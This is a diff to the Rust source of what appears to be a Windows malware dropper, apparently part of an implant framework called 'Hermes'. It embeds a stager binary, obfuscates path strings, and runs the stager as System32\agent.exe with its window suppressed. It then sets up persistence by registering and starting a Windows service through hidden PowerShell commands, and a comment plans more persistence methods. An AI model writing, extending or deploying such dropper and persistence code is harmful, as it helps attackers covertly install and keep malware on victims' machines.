@@ -1,5 +1,7 @@
 #![windows_subsystem = "windows"]
-use std::fs;
+#[cfg(feature = "windows-service")]
+use std::os::windows::process::CommandExt as _;
+use std::{fs, process};
 
 pub const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -21,11 +23,24 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         include_bytes!(concat!(env!("OUT_DIR"), "/stager.exe")),
     )?;
 
+    // Execute stager
+    #[cfg(feature = "windows-service")]
+    process::Command::new(obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"))
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn()?
+        .wait()?;
+    #[cfg(not(feature = "windows-service"))]
+    println!(
+        "{:#?}",
+        process::Command::new(obfstr::obfstr!("agent.exe"))
+            .spawn()?
+            .wait()?
+    );
+
     // TODO Implement multiple persistence methods
     #[cfg(feature = "windows-service")]
     {
-        use std::{os::windows::process::CommandExt as _, process::Command};
-        Command::new("powershell")
+        process::Command::new("powershell")
             .creation_flags(CREATE_NO_WINDOW)
             .arg("-Command")
             .arg("New-Service")
@@ -41,7 +56,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             .arg("'Hermes Agent Service'")
             .status()
             .expect("Failed to create service");
-        Command::new("powershell")
+        process::Command::new("powershell")
             .creation_flags(CREATE_NO_WINDOW)
             .arg("-Command")
             .arg("Start-Service")
